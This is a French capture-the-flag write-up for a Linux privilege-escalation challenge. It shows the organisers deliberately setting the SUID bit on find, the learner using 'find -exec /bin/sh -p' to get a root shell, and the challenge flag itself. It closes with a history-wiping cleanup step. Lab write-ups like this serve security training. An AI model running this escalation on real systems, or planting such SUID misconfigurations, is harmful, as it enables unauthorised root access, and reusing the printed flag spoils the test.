# Write-up — Iron Claw
**CryptAbyss CTF 2026 | Catégorie : Linux Privilege Escalation**

---

## Informations du challenge

| Champ | Détail |
|---|---|
| Nom | Iron Claw |
| Vaisseau | XENON-1 |
| Technique | SUID Abuse (GTFOBins) |
| CVSS | N/A — Mauvaise configuration |
| Difficulté | Facile |
| Catégorie | System |
| Auteur | Jeffrey JOANNEN / System |

---

## Description

> L'administrateur du vaisseau XENON-1 a configuré certains outils système pour qu'ils s'exécutent avec des privilèges élevés afin de faciliter la maintenance. Cependant, il semble avoir été un peu trop permissif avec l'utilitaire `find`.
>
> Arriverez-vous à détourner cet outil pour lire le secret de l'administrateur ?

**Accès fourni :**
```
User : operative
Pass : xen0n-access
```

---

## Mise en place de l'environnement (organisateurs)

### Création de l'utilisateur, du flag et de la faille

```bash
# Utilisateur joueur
useradd -m -s /bin/bash operative
echo "operative:xen0n-access" | chpasswd

# Flag final (root uniquement)
echo "CryptAbyss{5U1D_C0R3_5Y5T3M_0WN3D}" > /root/flag.txt
chmod 400 /root/flag.txt
chown root:root /root/flag.txt

# Application de la faille : bit SUID sur find
FIND_BIN=$(which find)
chmod u+s "$FIND_BIN"

# Lore : seul indice pour le joueur
cat > /home/operative/.system_anomaly.txt << 'ANOMALY'
[ JOURNAL DE BORD INTERNE — VAISSEAU XENON-1 ]

Cycle 2094.12 — Note de maintenance :
  Plusieurs **** ont recu des droits etendus
  pour simplifier les operations de routine.
  Le ***** a ete applique a au moins un *********
  couramment utilise.

  Aucune verification n'a ete faite sur les options
  d'execution de cet outil (-exec, par exemple).

  — Technicien #052
ANOMALY
chown operative:operative /home/operative/.system_anomaly.txt
chmod 600 /home/operative/.system_anomaly.txt
```

Vérification :
```bash
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root ... /usr/bin/find  ← doit afficher le 's'
```

---

## Write-up — Résolution pas à pas

### Étape 1 — Connexion et reconnaissance initiale

```bash
# Qui sommes-nous ?
id
# uid=1000(operative) gid=1000(operative) groups=1000(operative)

# Droits sudo ?
sudo -l
# User operative may not run sudo on xenon-1.

# Lire le lore pour trouver des indices
cat ~/.system_anomaly.txt
# → Indice : des outils de maintenance ont reçu des droits élevés, sans
#   vérification de leurs options d'exécution (type -exec)
```

### Étape 2 — Identification de la surface d'attaque

On cherche les binaires possédant le bit SUID :

```bash
find / -perm -4000 -type f 2>/dev/null
```

Résultat notable :
```
/usr/bin/find    ← inhabituel, find n'a normalement pas de bit SUID
/usr/bin/passwd
/usr/bin/su
/usr/bin/newgrp
...
```

On confirme la présence du bit SUID sur `find` :

```bash
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root ... /usr/bin/find
```

### Étape 3 — Compréhension de la vulnérabilité

Le bit **SUID** (Set User ID) est une permission spéciale qui force l'exécution d'un binaire avec les droits de son **propriétaire** (ici `root`), peu importe l'utilisateur qui le lance.

`find` est particulièrement dangereux avec ce bit car il dispose d'une option `-exec` permettant d'exécuter des commandes arbitraires — qui hériteront alors des droits root.

> Ressource utile : [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)

### Étape 4 — Exploitation

On utilise `find` pour ouvrir un shell qui hérite des privilèges SUID :

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

Explication des options :
- `-exec /bin/sh -p` : lance un shell en préservant les privilèges effectifs (`-p` empêche le shell de dropper l'UID effectif)
- `\;` : termine la commande `-exec`
- `-quit` : quitte `find` immédiatement après la première exécution

### Étape 5 — Obtention du flag

```bash
whoami
# root

cat /root/flag.txt
```

**Flag :** `CryptAbyss{5U1D_C0R3_5Y5T3M_0WN3D}`

---

## Résumé de l'attaque

```
operative (uid=1000)
    ↓ cat ~/.system_anomaly.txt → indice sur un outil mal configuré
    ↓ find / -perm -4000 → /usr/bin/find avec bit SUID détecté
    ↓ find . -exec /bin/sh -p \; -quit
root shell (uid=0)
    ↓ cat /root/flag.txt
CryptAbyss{5U1D_C0R3_5Y5T3M_0WN3D}
```

---

## Nettoyage (post-CTF)

```bash
# Retirer le bit SUID de find
chmod u-s /usr/bin/find

# Effacer l'historique
history -c && rm ~/.bash_history
```

---

## Flags

| Flag | Valeur |
|---|---|
| Final | `CryptAbyss{5U1D_C0R3_5Y5T3M_0WN3D}` |

*(Pas de flag intermédiaire pour ce challenge.)*

---

## Références

- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
- [HackTricks — SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-and-sgid)
